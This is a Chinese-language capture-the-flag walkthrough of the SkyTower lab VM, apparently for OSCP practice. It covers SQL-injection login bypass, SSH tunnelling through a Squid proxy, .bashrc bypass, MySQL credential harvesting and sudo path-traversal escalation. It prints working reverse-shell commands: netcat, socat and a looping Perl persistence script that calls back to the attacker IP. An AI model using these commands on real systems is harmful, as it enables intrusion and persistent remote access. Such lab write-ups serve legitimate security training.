## 简介

该项目是Telspace作者在ITWeb安全峰会和BSidesCPT（开普敦）上为CTF设计的项目环境，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该文章，都能学习到一些红队知识。

该项目有始有终会用到信息收集->各类服务端口信息枚举->Mysql信息枚举->sudo提权，最终拿到flag.txt的过程，那么在四大模块中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

 **请注意：**

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

## 一、信息收集

信息收集非常重要，有了信息才能知道下一步该如何进行，接下来将用nmap来演示信息收集：

### 1、nmap扫描存活IP

由于本项目环境是nat模式需要项目IP地址，扫描挖掘本地的IP地址信息：  
![1651816932_6274b9e42f798165f6bad.png!small?1651816932812](https://image.3001.net/images/20220506/1651816932_6274b9e42f798165f6bad.png!small?1651816932812)  
本机IP为： **192.168.40.138**

发现本kali ip为40段！用40段进行全网段扫描：

    
    
    nmap -sP 192.168.40.0/24 
    

![1651816936_6274b9e8ce221f8a06990.png!small?1651816942188](https://image.3001.net/images/20220506/1651816936_6274b9e8ce221f8a06990.png!small?1651816942188)  
发现项目IP：192.168.40.158

### 2、nmap全端口服务枚举

进行namp全端口服务枚举：

    
    
    nmap -sS -sV -A -T5 192.168.40.158
    

![1651816941_6274b9ed2df4be2b545ba.png!small?1651816942188](https://image.3001.net/images/20220506/1651816941_6274b9ed2df4be2b545ba.png!small?1651816942188)  
得到开放的端口信息：

    
    
    22/tcp   filtered ssh
    80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
    3128/tcp open     http-proxy Squid http proxy 3.1.20
    

**开启了三个端口：**

    
    
    1. 22端口显示filtered说明还被过滤了；
    2. 3128 squid-http 是代理端口，可以去做端口转发开启ssh；
    3. 开放80端口的web应用，看看能否拿到webshell
    

## 二、Web信息探测

### 1、Web页面枚举

访问80端口：

    
    
    http://192.168.40.158/
    

![1651816947_6274b9f3946f87d563cb5.png!small?1651816948671](https://image.3001.net/images/20220506/1651816947_6274b9f3946f87d563cb5.png!small?1651816948671)  
发现登录页面，可能存在sql注入，暴力破解，cms框架漏洞，插件漏洞等情况！

### 2、sql注入绕过验证

Burp Intruder作为Burp
Suite中一款功能极其强大的自动化测试工具，通常被系统安全渗透测试人员被使用在各种任务测试的场景中。在渗透测试过程中，我们经常使用Burp
Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp
Intruder通常被使用在以下场景：

利用burpsuite抓包拦截发送到->intruder进行sql注入爆破：  
![1651816952_6274b9f8b9d7c2156a25f.png!small?1651816953931](https://image.3001.net/images/20220506/1651816952_6274b9f8b9d7c2156a25f.png!small?1651816953931)

为了确保选择email和password字段，攻击类型设置：pitchfork：  
![1651816956_6274b9fcabc810d7549f4.png!small?1651816956847](https://image.3001.net/images/20220506/1651816956_6274b9fcabc810d7549f4.png!small?1651816956847)

playload设置，利用下列源码：

    
    
    https://github.com/melbinkm/SQL-Injection-Payloads/blob/master/sqli_auth.list
    

![1651816960_6274ba00e5bcbb2ebce76.png!small?1651816961507](https://image.3001.net/images/20220506/1651816960_6274ba00e5bcbb2ebce76.png!small?1651816961507)

复制至kali，生成1.txt：

    
    
    gedit 1.txt
    

![1651816965_6274ba0557de3303a6b7f.png!small?1651816965607](https://image.3001.net/images/20220506/1651816965_6274ba0557de3303a6b7f.png!small?1651816965607)

payloads1和2导入1.txt的文本，并单击Start Attack！  
![1651816968_6274ba08ce6c227e8c99b.png!small?1651816969129](https://image.3001.net/images/20220506/1651816968_6274ba08ce6c227e8c99b.png!small?1651816969129)![1651816972_6274ba0c847aaec792838.png!small?1651816972818](https://image.3001.net/images/20220506/1651816972_6274ba0c847aaec792838.png!small?1651816972818)

攻击完成时，各选择不同长度的进行测试，查看能否利用绕过：  
![1651816976_6274ba10e212b690f8568.png!small?1651816977461](https://image.3001.net/images/20220506/1651816976_6274ba10e212b690f8568.png!small?1651816977461)  
经测试，含有1838的内容都是成功回显。  
**注意：**该处要判断成功情况，可以从Length和Status进行回显判断！

复制该请求，将数据包放Repeater发送：  
![1651816981_6274ba159f0b52bb5e19a.png!small?1651816982099](https://image.3001.net/images/20220506/1651816981_6274ba159f0b52bb5e19a.png!small?1651816982099)

获得账号密码：

    
    
    Username: john
    Password: hereisjohn
    

## 三、proxychains代理squid

ProxyChains是Linux和其他Unix下的代理工具。 它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、
SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。 ProxyChains通过一个用户定义的代理列表强制连接指定的应用程序，
直接断开接收方和发送方的连接。

接下来除了介绍ProxyChains还会介绍另外一种技巧去设置代理！

### 1、ssh测试

尝试使用账户密码登录ssh：

    
    
    ssh john@192.168.40.158   
    Username: john
    Password: hereisjohn
    

![1651816987_6274ba1b368b188166d36.png!small?1651816987282](https://image.3001.net/images/20220506/1651816987_6274ba1b368b188166d36.png!small?1651816987282)

发现无法直接连接22端口，在端口扫描的时候有提示22端口过滤了，有3128代理端口，那就尝试代理转发

### 2、代理转发

在proxychains添加http代理端口：

    
    
    vi /etc/proxychains4.conf
    http 192.168.40.158 3128
    

![1651816992_6274ba2096a776abd915a.png!small?1651816997309](https://image.3001.net/images/20220506/1651816992_6274ba2096a776abd915a.png!small?1651816997309)

使用proxychains进行代理登录ssh：

    
    
    proxychains ssh john@192.168.40.158
    

![1651816996_6274ba24bd4d461a04a50.png!small?1651816997309](https://image.3001.net/images/20220506/1651816996_6274ba24bd4d461a04a50.png!small?1651816997309)

显示了登录成功，但是自动断开了，提示：  
Funds have been withdrawn

## 四、proxytunnel隧道代理

proxytunnel是一款利用http
connection封装技术建立隧道的工具，kali默认安装，使用条件：防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景，可以理解为端口转发技术，将本地端口和项目sqi端口进行连接隧道转发进行！

将kali与项目的3128端口建立隧道，隧道建立的端口转发到项目本地的22端口，然后在映射到kali本地1234端口：

    
    
    proxytunnel -p 192.168.40.158:3128 -d 127.0.0.1:22 -a 1234  
    -a 指定本地侦听端口
    -p 使用代理
    -r 使用第二个代理
    -d 指定访问的目标和端口
    ssh john@127.0.0.1 -p 1234
    

![1651817001_6274ba29f0cd85d34c128.png!small?1651817002845](https://image.3001.net/images/20220506/1651817001_6274ba29f0cd85d34c128.png!small?1651817002845)

成功登录，同样自动断开了。

## 五、SSH配合bashrc反弹shell

### 1、SSH命令执行

ssh远程执行命令可以用-t配合输入命令！

既然能登录，就尝试执行查看目录命令：

    
    
    proxychains ssh -t john@192.168.40.158 ls -la
    

![1651817007_6274ba2fdfac7a51ccfa1.png!small?1651817008354](https://image.3001.net/images/20220506/1651817007_6274ba2fdfac7a51ccfa1.png!small?1651817008354)

可以正常执行命令，看到有bashrc文件，猜想登录上去被踢出来的原因在这里，先看看其内容。

### 2、bashrc利用

.bashrc是home目录下的一个shell文件，用于储存用户的个性化设置。在bash每次启动时都会加载.bashrc文件中的内容，并根据内容定制当前bash的配置和环境，每次启动bashshell时，.bashrc脚本都会自动运行。

查看下.bashrc文件内容：

    
    
    proxychains ssh -t john@192.168.40.158 cat .bashrc
    

![1651817012_6274ba346f41be499b161.png!small?1651817012709](https://image.3001.net/images/20220506/1651817012_6274ba346f41be499b161.png!small?1651817012709)![1651817016_6274ba3846b905be73984.png!small?1651817016600](https://image.3001.net/images/20220506/1651817016_6274ba3846b905be73984.png!small?1651817016600)  
红框内的信息分析： **i 选项是关闭的和exit，这里面的命令导致结束shell！**  
这里有两种方法操作：

    
    
    1. 删除.bashrc或将.bashrc改名，即可远程登录上去
    2. 删除内容.bashrc或者替换其内容信息，可以通过nc直接反弹shell来完成
    

### 3、命令执行反弹shell

查看项目有无装python和nc：

    
    
    proxychains ssh john@192.168.40.158 -t "which python"  
    proxychains ssh john@192.168.40.158 -t "which nc"  
    

![1651817021_6274ba3d4b999f6bd8620.png!small?1651817021616](https://image.3001.net/images/20220506/1651817021_6274ba3d4b999f6bd8620.png!small?1651817021616)  
发现靶机装了nc！

接下来将bashrc文件改名登录：

    
    
    proxytunnel -p 192.168.40.158:3128 -d 127.0.0.1:22 -a 1234
    ssh john@127.0.0.1 -p 1234 mv .bashrc .bashrc.bak   
    ssh john@127.0.0.1 -p 1234
    hereisjohn
    

![1651817026_6274ba42c7edc9fa1d659.png!small?1651817027836](https://image.3001.net/images/20220506/1651817026_6274ba42c7edc9fa1d659.png!small?1651817027836)  
这里有两种形式，一种是反弹shell利用nc获得，这里用了第二种方法进行，前面查看bashrc发现阻碍我们登录ssh的是bashrc内的配置信息，将该文件改名去掉，把么执行ssh的时候就找不到bashrc，就无法运行bashrc了，这时候就正常登录使用稳定shell了！

## 六、mysql信息枚举

### 1、sudo信息枚举

查看sudo能否提权：

    
    
    sudo -l
    

![1651817030_6274ba464c153ded4c856.png!small?1651817030526](https://image.3001.net/images/20220506/1651817030_6274ba464c153ded4c856.png!small?1651817030526)  
发现不行，看下根目录的信息。

### 2、根目录信息枚举

查看网站根目录的底层文件login.php：

    
    
    cd /var/www/
    ls
    cat login.php
    

![1651817034_6274ba4addb4e99d3a4a2.png!small?1651817035381](https://image.3001.net/images/20220506/1651817034_6274ba4addb4e99d3a4a2.png!small?1651817035381)

发现mysql用户密码：

    
    
    root/root
    

这里往下查看源码配置信息，发现这是阻碍前面SQL注入的规则：

    
    
    $sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
    

这是sql语句的限制！

### 3、mysql信息枚举

mysql渗透信息枚举的步骤： **查库- >查表->查字段->查内容**

1）登录数据库，库信息枚举：

    
    
    mysql -uroot -proot
    show databases;
    

![1651817040_6274ba5057e0e52c260a8.png!small?1651817040728](https://image.3001.net/images/20220506/1651817040_6274ba5057e0e52c260a8.png!small?1651817040728)  
进入SkyTech数据库查看。

2）表信息枚举

    
    
    use SkyTech；         #登录SkyTech数据库
    show tables;          #查看表
    select * from login;  #查找login
    

![1651817045_6274ba550cfc65ed16b86.png!small?1651817045267](https://image.3001.net/images/20220506/1651817045_6274ba550cfc65ed16b86.png!small?1651817045267)

存在三个账号密码信息！

    
    
    |  1 |john@skytech.com    | hereisjohn   |
    |  2 | sara@skytech.com    | ihatethisjob |
    |  3 | william@skytech.com | senseable 
    

3）尝试Sara登录

    
    
    ssh sara@127.0.0.1 -p 1234 mv .bashrc .bashrc.bak   
    ssh sara@127.0.0.1 -p 1234
    ihatethisjob
    

![1651817050_6274ba5ab978a23123bf8.png!small?1651817050896](https://image.3001.net/images/20220506/1651817050_6274ba5ab978a23123bf8.png!small?1651817050896)  
通过mysql信息枚举到用户名密码信息，尝试成功登录！

## 七、提权

### 1、sudo提权

查看sudo能否提权：

    
    
    sudo -l
    

![1651817055_6274ba5f042f9b4795260.png!small?1651817055208](https://image.3001.net/images/20220506/1651817055_6274ba5f042f9b4795260.png!small?1651817055208)

    
    
    User sara may run the following commands on this host:
        (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
    

可以看到，sara用户允许使用sudo命令cat或ls /accounts目录下的任何文件。

### 2、获取flag

查看accounts目录root信息：

    
    
    sudo ls /accounts/../root
    sudo cat /accounts/../root/flag.txt
    

![1651817059_6274ba6328799d74f72a1.png!small?1651817059265](https://image.3001.net/images/20220506/1651817059_6274ba6328799d74f72a1.png!small?1651817059265)

    
    
    Congratz, have a cold one to celebrate!
    root password is theskytower
    

获得root的密码： **theskytower**

### 3、获得root权限

    
    
    ssh root@127.0.0.1 -p 1234
    theskytower
    

![1651817063_6274ba675a1997eab2345.png!small?1651817063529](https://image.3001.net/images/20220506/1651817063_6274ba675a1997eab2345.png!small?1651817063529)  
成功登录，获得root权限！

## 八、知识拓展技巧

### 1、建立稳定tty shell

本地kali开启nc，将项目流量转发至本地：

    
    
    nc -vlp 5566
    ssh john@127.0.0.1 -p 1234 nc 192.168.40.138 5566 -e /bin/bash
    

![1651817067_6274ba6bdc6caaf1d7c34.png!small?1651817068591](https://image.3001.net/images/20220506/1651817067_6274ba6bdc6caaf1d7c34.png!small?1651817068591)

Socat是一个多功能的网络工具，名字来由是” Socket
CAT”，可以看作是netcat的N倍加强版，socat是一个两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、插座（Unix，IP4，IP6
- raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。

Socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和
PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell
Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。

socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6,
pipe,exec,system,open,proxy,openssl,socket等。

接下来利用socat进行建立稳定shell！

本地开启http服务，上传socat文件：

    
    
    python -m SimpleHTTPServer 8081
    wget http://192.168.40.138:8081/socat
    ls -la
    

![1651817073_6274ba717f74aa07565ba.png!small?1651817074736](https://image.3001.net/images/20220506/1651817073_6274ba717f74aa07565ba.png!small?1651817074736)  
上传成功!

socat赋权：

    
    
    chmod +x socat   赋权
    

![1651817077_6274ba759bbdc6b1795f6.png!small?1651817077938](https://image.3001.net/images/20220506/1651817077_6274ba759bbdc6b1795f6.png!small?1651817077938)  
赋权成功！

本地开启9999端口服务，利用socat反弹稳定shell：

    
    
    nc -vlp 9999
    HOME=/dev/shm ./socat tcp:192.168.40.138:9999 exec:'/bin/bash -li',pty,stderr,sigint,sighup,sigquit,sane
    

![1651817081_6274ba7968b2ae112fc51.png!small?1651817081832](https://image.3001.net/images/20220506/1651817081_6274ba7968b2ae112fc51.png!small?1651817081832)  
反弹成功！

使用script补齐命令：

    
    
    script -qc bash /dev/null
    sudo -l
    

![1651817086_6274ba7e8e1f708f74590.png!small?1651817088838](https://image.3001.net/images/20220506/1651817086_6274ba7e8e1f708f74590.png!small?1651817088838)  
成功交互tty，并回显无法运行sudo

### 2、bashrc文件内容替换删除

1）sed替换

用sed将bashrc文件中的exit全部替换为echo：

    
    
    ssh john@127.0.0.1 -p 1234 -t "sed -i 's/exit/echo/g' .bashrc"
    -i  直接修改文件
    hereisjohn
    

![1651817091_6274ba835d6579448e130.png!small?1651817091665](https://image.3001.net/images/20220506/1651817091_6274ba835d6579448e130.png!small?1651817091665)

2）head 删除

用head 将bashrc文件中的最后三行信息删除：

    
    
    ssh john@127.0.0.1 -p 1234 -t "head -n -3 .bashrc > .bashrc"
    -n -3 删除最后三行文件
    hereisjohn
    

![1651817095_6274ba874d4bfa1ce80a9.png!small?1651817095658](https://image.3001.net/images/20220506/1651817095_6274ba874d4bfa1ce80a9.png!small?1651817095658)  
成功登录！

### 3、计划任务反弹shell

避免代理被对方关闭，可建立计划任务的shell  
1）编写sh脚本，反弹至kali的7777端口：

    
    
    #!/bin/sh
    while true; do
        perl -e 'use Socket;$i="192.168.40.138";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
        # sleep for 300 seconds (5 mins)
        sleep 300
    done
    

![1651817100_6274ba8c1a64ff5a7c3a3.png!small?1651817100451](https://image.3001.net/images/20220506/1651817100_6274ba8c1a64ff5a7c3a3.png!small?1651817100451)  
因为shell是通过22端口代理进去的实战中防止万一情况发生，由于对方安装了perl，所以用该进行反弹！每五分钟会回弹一次！

2）开启http服务上传sh脚本：

    
    
    python -m SimpleHTTPServer 8081
    wget http://192.168.40.138:8081/1.sh
    

![1651817103_6274ba8fb1c2c679e4488.png!small?1651817104326](https://image.3001.net/images/20220506/1651817103_6274ba8fb1c2c679e4488.png!small?1651817104326)  
上传成功！

3）脚本赋权并执行：

    
    
    chmod +x 1.sh
    ./1.sh
    

![1651817108_6274ba949f97c09fd3533.png!small?1651817109664](https://image.3001.net/images/20220506/1651817108_6274ba949f97c09fd3533.png!small?1651817109664)  
反弹成功！

## 九、总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如nmap全端口信息枚举、sql注入、ssh
proxytunnel代理转发和ProxyChains代理转发、Mysql信息枚举、SSH-sudo登录内核提权、tty建立方法、计划任务反弹shell、绕过bashrc文件方法等等，希望伙伴们能实际操作复现一遍！来巩固自身的渗透技术和技巧！

希望大家提高安全意识，没有网络安全就没有国家安全！

作者：十七

